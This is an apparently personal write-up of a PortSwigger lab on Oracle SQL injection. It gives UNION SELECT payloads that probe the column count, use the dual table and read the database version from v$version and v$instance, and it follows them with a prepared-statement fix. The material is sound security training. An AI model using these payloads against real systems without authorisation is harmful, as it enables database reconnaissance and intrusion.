# PortSwigger — SQL Injection Attack, Querying the Database Type and Version on Oracle

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

The application is vulnerable to SQL injection via a product category filter. By querying the database metadata (using Oracle-specific syntax), we can identify the database type and version, then construct appropriate payloads for further exploitation.

**Lab URL:** `https://portswigger.net/web-security/sql-injection/lab-querying-the-database-type-and-version-oracle`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to query the database type and version. To solve the lab, retrieve this information from the database.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection**
- Database: **Oracle**
- Goal: Identify the database type and version through SQL injection

---

## Recon

### Step 1 — Identify the injection point

The product category filter is injectable (as in previous labs):

```
GET /filter?category=Gifts HTTP/2
```

The backend query is likely:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

### Step 2 — Determine the number of columns

Using `ORDER BY` or `UNION SELECT` with incrementing NULLs:

```
/filter?category=Gifts' UNION SELECT NULL--
/filter?category=Gifts' UNION SELECT NULL, NULL--
/filter?category=Gifts' UNION SELECT NULL, NULL, NULL--
```

Oracle requires a `FROM` clause (even if selecting constants), so we use the dummy table `dual`:

```
/filter?category=Gifts' UNION SELECT NULL FROM dual--
```

This reveals the number of columns by trial.

### Step 3 — Identify the database

Once column count is known, we query Oracle system views:

```sql
SELECT banner FROM v$version WHERE rownum = 1
```

Or simpler:

```sql
SELECT version FROM v$instance
```

---

## Exploitation

### Step 4 — Extract database version (Oracle-specific)

Assuming 4 columns, the payload becomes:

```
' UNION SELECT NULL, banner, NULL, NULL FROM v$version WHERE rownum = 1--
```

Or using database version function:

```
' UNION SELECT NULL, version, NULL, NULL FROM v$instance--
```

### Step 5 — Validate results

The response displays the Oracle version banner, confirming:
- Database type: **Oracle**
- Version: (e.g., Oracle Database 19c)

---

## Attack Chain Summary

```
Browse application → /filter?category=Gifts
        ↓
Identify SQLi on category parameter
        ↓
Test UNION SELECT to find column count
        ↓
Oracle requires FROM clause → use dual table
        ↓
Query v$version or v$instance for database info
        ↓
Database type and version revealed
        ↓
LAB SOLVED ✅
```

---

## Key Database Identification Techniques

| Database | Version Query | Notes |
|---|---|---|
| **Oracle** | `SELECT banner FROM v$version` | Requires `FROM` clause; use dummy table `dual` |
| **MySQL** | `SELECT @@version` | System variable access |
| **PostgreSQL** | `SELECT version()` | Built-in function |
| **MSSQL** | `SELECT @@version` | System variable access |

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Reference |
|---|---|
| **CWE-89** | SQL Injection |
| **CWE-200** | Information Exposure |
| **OWASP A03:2021** | Injection |

**Why querying versions matters:**
- Version-specific exploits: Some vulnerabilities only exist in certain versions
- Database-specific payloads: Different DBs require different syntax for advanced attacks
- Reconnaissance for further attacks: Information gathering phase before privilege escalation

### Secure Code Fix

**❌ Vulnerable pattern:**
```php
$category = $_GET['category'];
$query = "SELECT * FROM products WHERE category = '$category'";
```

**✅ Secure pattern (prepared statement):**
```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = :category");
$stmt->execute([':category' => $_GET['category']]);
```

**Best Practices:**
1. Always use parameterized queries
2. Never concatenate user input into SQL
3. Apply principle of least privilege — database account should not have access to system views
4. Error handling — do not expose detailed database errors to users

---

## Key Takeaways

**Technical Skills:**
- Adapted SQL injection payloads to Oracle-specific syntax (`FROM dual`)
- Queried system tables (`v$version`, `v$instance`) for metadata
- Understood how `UNION SELECT` acts as an information disclosure vector

**Security Concepts:**
- Database identification is the first step in post-exploitation recon
- SQL injection enables unlimited data access — including sensitive metadata
- Different databases have different SQL syntax and system tables

---

## References

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger — Querying Database Type and Version](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [Oracle System Views (v$version, v$instance)](https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/dynamic-performance-views-1.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
````
